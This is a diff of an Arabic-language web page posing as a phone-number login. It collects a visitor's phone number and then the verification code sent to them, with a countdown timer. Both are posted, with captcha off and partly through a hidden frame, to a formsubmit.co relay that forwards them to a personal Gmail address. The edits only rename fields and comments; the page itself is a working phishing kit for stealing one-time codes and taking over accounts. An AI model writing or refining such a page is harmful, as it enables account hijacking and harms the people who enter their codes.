@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>دخول باستخدام الهاتف</title>
+  <title>دخول الهاتف</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
@@ -81,23 +81,23 @@
     <!-- نموذج إرسال رقم الهاتف -->
     <form id="phoneForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST" target="dummyFrame" onsubmit="return sendPhone();">
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="نوع_الطلب" value="إرسال رقم الهاتف فقط">
+      <input type="hidden" name="request_type" value="Send Phone Only">
 
       <label for="phone">رقم الهاتف:</label>
-      <input type="tel" id="phone" name="رقم_الهاتف" required pattern="[0-9]{10,15}" placeholder="05xxxxxxxxx">
+      <input type="tel" id="phone" name="phone_number" required pattern="[0-9]{10,15}" placeholder="05xxxxxxxxx">
 
       <button type="submit">أرسل الكود</button>
     </form>
 
-    <!-- نموذج الكود -->
+    <!-- نموذج إدخال الكود -->
     <div id="codeSection">
       <form id="codeForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST" onsubmit="return prepareToSend();">
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="نوع_الطلب" value="طلب الدخول">
-        <input type="hidden" name="رقم_الهاتف" id="phoneHidden">
+        <input type="hidden" name="request_type" value="Code + Phone">
+        <input type="hidden" name="phone_number" id="phoneHidden">
 
         <label for="code">الكود:</label>
-        <input type="text" id="code" name="كود_الدخول" placeholder="أدخل الكود هنا" required>
+        <input type="text" id="code" name="code_value" placeholder="أدخل الكود هنا" required>
 
         <div id="timer">الوقت المتبقي: 05:00</div>
 
@@ -119,13 +119,13 @@
         return false;
       }
 
-      // تعطيل الحقل ومنع التعديل
+      // تعطيل التعديل على رقم الهاتف
       phoneInput.disabled = true;
 
       // نسخ الرقم إلى النموذج الثاني
       document.getElementById('phoneHidden').value = phone;
 
-      // إظهار الكود والعداد
+      // إظهار حقل الكود والعداد
       setTimeout(() => {
         document.getElementById('codeSection').style.display = 'block';
         startTimer(300);
@@ -135,7 +135,7 @@
     }
 
     function prepareToSend() {
-      // تأكد من نسخ رقم الهاتف عند الإرسال النهائي أيضًا
+      // ضمان نقل رقم الهاتف للحقل الخفي دومًا
       const phone = document.getElementById('phone').value.trim();
       document.getElementById('phoneHidden').value = phone;
 
